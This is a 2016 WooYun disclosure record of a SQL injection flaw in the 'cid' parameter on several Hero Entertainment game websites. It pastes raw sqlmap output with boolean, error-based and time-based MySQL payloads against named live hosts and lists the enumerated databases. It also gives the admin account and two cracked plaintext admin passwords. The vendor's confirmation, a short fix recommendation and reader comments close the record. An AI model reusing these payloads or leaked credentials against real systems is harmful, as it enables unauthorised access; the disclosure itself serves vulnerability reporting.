{"id": 74388, "wybug_id": "wooyun-2016-0170033", "wybug_title": "英雄互娱旗下通用型SQL注入(全名枪战/天天炫舞/夏目的美丽日记/功夫全明星)管理后台沦陷", "wybug_corp": "英雄互娱", "wybug_author": "mango", "wybug_date": "2016-01-15 00:25", "wybug_open_date": "2016-02-27 11:49", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "管理后台对外"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-27：\t细节向公众公开  简要描述：  不知道如何getshell 也没继续看~   详细说明：    只要是游戏官网可以打开/m/list.html?cid=1基本都有注入  参数cid  http://xm.yingxiong.com/m/list.html?cid=1 (GET) \nsqlmap identified the following injection points with a total of 73 HTTP(s) requests:---Parameter: cid (GET)    Type: boolean-based blind    Title: MySQL >= 5.0 boolean-based blind - Parameter replace    Payload: cid=(SELECT (CASE WHEN (1182=1182) THEN 1182 ELSE 1182*(SELECT 1182 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: cid=1 AND (SELECT 6605 FROM(SELECT COUNT(*),CONCAT(0x7171627871,(SELECT (ELT(6605=6605,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: cid=1 AND (SELECT * FROM (SELECT(SLEEP(5)))DVat)---back-end DBMS: MySQL 5.0sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: cid (GET)    Type: boolean-based blind    Title: MySQL >= 5.0 boolean-based blind - Parameter replace    Payload: cid=(SELECT (CASE WHEN (1182=1182) THEN 1182 ELSE 1182*(SELECT 1182 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: cid=1 AND (SELECT 6605 FROM(SELECT COUNT(*),CONCAT(0x7171627871,(SELECT (ELT(6605=6605,1))),0x7170766b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: cid=1 AND (SELECT * FROM (SELECT(SLEEP(5)))DVat)---back-end DBMS: MySQL 5.0available databases [2]:[*] information_schema[*] xmcms\nhttp://demo.yingxiong.com/m/list.html?cid= (GET)\nsqlmap identified the following injection points with a total of 73 HTTP(s) requests:---Parameter: cid (GET)    Type: error-based    Title: MySQL >= 5.0 error-based - Parameter replace    Payload: cid=(SELECT 2365 FROM(SELECT COUNT(*),CONCAT(0x716a707871,(SELECT (ELT(2365=2365,1))),0x7176707171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)---back-end DBMS: MySQL 5.0sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: cid (GET)    Type: error-based    Title: MySQL >= 5.0 error-based - Parameter replace    Payload: cid=(SELECT 2365 FROM(SELECT COUNT(*),CONCAT(0x716a707871,(SELECT (ELT(2365=2365,1))),0x7176707171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)---back-end DBMS: MySQL 5.0available databases [2]:[*] gongfu[*] information_schema\n我就不一一贴了最后发现管理账号都市qq@qq.com  密码能解开两个 !rjkXM 和 rfF4gi  使用这个两个密码基本没什么阻碍了   漏洞证明：  \n\n\n\n\n\n   修复方案：  后台神马的还是别对外网开放。仔细检查SQL问题   版权声明：转载请注明来源 mango@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2016-01-15 14:43 厂商回复： 漏洞存在 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-15 00:30 |    \t\tdslxin \t\t\t( 普通白帽子  |\t\t\t        Rank:136 漏洞数:35        | 岁月你别催)\t\t \n  我来了，楼下的看这里。。    \n     2016-01-15 09:35 |    \t\tAasron \t\t\t( 普通白帽子  |\t\t\t        Rank:215 漏洞数:59        | 工欲善其事，必先利其器)\t\t \n  还好我不玩    \n     2016-01-15 10:48 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:1662 漏洞数:248        | WooYun is the Bigest gay place.  网络工...)\t\t \n  大兄弟，标题错啦，。全名枪战    \n     2016-01-15 12:13 |    \t\t天地不仁 以万物为刍狗 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:342        | 本乌云账户唯一QQ 177712xx4)\t\t \n  我已经不想说话了···明天我就换个账号  这个账号不能用了    \n     2016-01-15 12:47 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1868 漏洞数:275        | 出一份微不足道的\"力\")\t\t \n  @天地不仁 以万物为刍狗 @_Thorns 哈哈哈    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 9, "Ranks": null}